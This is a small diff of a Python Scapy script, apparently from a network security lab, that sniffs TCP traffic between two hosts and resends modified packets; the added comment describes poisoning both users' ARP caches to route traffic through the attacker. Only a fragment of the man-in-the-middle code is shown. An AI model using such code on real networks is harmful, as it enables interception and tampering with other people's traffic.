@@ -35,7 +35,7 @@ def spoof_ARP(pkt):
     del(newpkt[TCP].chksum)
     send(newpkt)
 
-    
 
 f1 = 'tcp and (ether src ' +  A_MAC + ' or ' + 'ether src ' + B_MAC + ' )'
+# poison User A and B's ARP cache of each other to attacker's MAC Address, then modify the packets
 pkt = sniff(iface='br-f659e2f7cd2a', filter=f1, prn=spoof_ARP)
